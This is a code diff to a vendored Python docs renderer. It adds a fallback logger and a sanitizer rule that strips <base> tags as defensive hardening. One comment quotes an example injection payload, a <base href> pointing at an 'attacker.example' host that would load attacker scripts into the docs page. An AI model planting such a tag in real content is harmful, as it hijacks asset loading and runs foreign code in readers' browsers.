@@ -10,9 +10,10 @@ is not vendored because this repo ships no ``docsfy-images/`` source.
 Upstream behaviour is preserved, including the "Generated with docsfy" badge,
 which keeps working via the ``docsfy_repo_url`` template variable.
 
-It is a vendored copy, so local modifications are expected. The one current
-deviation is ``_indent_fenced_blocks`` (see its docstring), which only affects
-``llms-full.txt``; the HTML rendering path is byte-identical to upstream.
+It is a vendored copy, so local modifications are expected. The local
+deviations are ``_indent_fenced_blocks`` (see its docstring, ``llms-full.txt``
+only) and the ``<base>`` strip in ``_sanitize_html`` (local hardening, see
+there); everything else is byte-identical to upstream.
 """
 
 from __future__ import annotations
@@ -30,7 +31,25 @@ from typing import Any
 import markdown
 from jinja2 import Environment, FileSystemLoader, select_autoescape
 
-logger = logging.getLogger(__name__)
+from webhook_server.utils.helpers import get_logger_with_params
+
+
+def _make_logger() -> logging.Logger:
+    """Build the project logger, degrading to stdlib when no runtime config exists.
+
+    ``get_logger_with_params()`` constructs a ``Config``, which raises when
+    ``$WEBHOOK_SERVER_DATA_DIR/config.yaml`` is absent. A docs rebuild must run
+    on a bare checkout with no webhook-server deployment, so fall back to a
+    plain stdlib logger rather than aborting over a missing config. A config
+    that exists but is malformed is left to fail loudly.
+    """
+    try:
+        return get_logger_with_params()
+    except (OSError, ValueError):
+        return logging.getLogger(__name__)
+
+
+logger = _make_logger()
 
 DOCSFY_REPO_URL = "https://github.com/myk-org/docsfy"
 
@@ -70,6 +89,12 @@ def _sanitize_html(html: str) -> str:
     for tag in ["iframe", "object", "embed", "form"]:
         html = re.sub(rf"<{tag}[^>]*>.*?</{tag}>", "", html, flags=re.DOTALL | re.IGNORECASE)
         html = re.sub(rf"<{tag}[^>]*/>", "", html, flags=re.IGNORECASE)
+    # LOCAL HARDENING, not present upstream: strip <base>. It is a void element,
+    # so the paired/self-closing loop above misses it, and a markdown-supplied
+    # <base href="https://attacker.example/"> re-points every relative asset URL
+    # in templates/page.html (assets/style.css, assets/search.js, ...) at an
+    # attacker-controlled host whose responses then execute in the docs page.
+    html = re.sub(r"<base\b[^>]*>", "", html, flags=re.IGNORECASE)
     # Remove event handler attributes
     html = re.sub(r'\s+on\w+\s*=\s*["\'][^"\']*["\']', "", html, flags=re.IGNORECASE)
     html = re.sub(r"\s+on\w+\s*=\s*\S+", "", html, flags=re.IGNORECASE)
